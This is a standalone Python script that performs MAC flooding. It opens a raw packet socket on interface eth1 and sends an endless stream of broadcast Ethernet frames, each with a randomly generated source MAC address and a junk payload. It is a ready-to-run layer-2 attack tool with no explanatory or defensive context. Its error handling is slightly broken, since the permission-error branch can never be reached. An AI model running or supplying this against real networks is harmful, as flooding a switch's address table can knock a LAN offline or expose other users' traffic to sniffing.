import socket
import struct
import random

def main ():
    interface = "eth1"
    dst_mac = bytes.fromhex("ff:ff:ff:ff:ff:ff".replace(":", ""))
    eth_type = 0x0900
    payload = "garbage value ".encode() * 10

    try:
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as raw_socket:
            raw_socket.bind((interface, 0))
            while True:                                                             
                src_mac = bytes([random.randint(0,255) for _ in range(6)])
                frame = struct.pack("!6s6sH", dst_mac, src_mac, eth_type) + payload
                raw_socket.send(frame)
                print("Mac flooding has been started....")
    except KeyboardInterrupt:
        print("Stopping MAC flooding...")  
    except Exception as error:
        print(f"An error occurred: {error}")
    except PermissionError:
        print("Permission denied: You need to run this script with elevated privileges (e.g., as root).")
if __name__ == "__main__":    main()
    
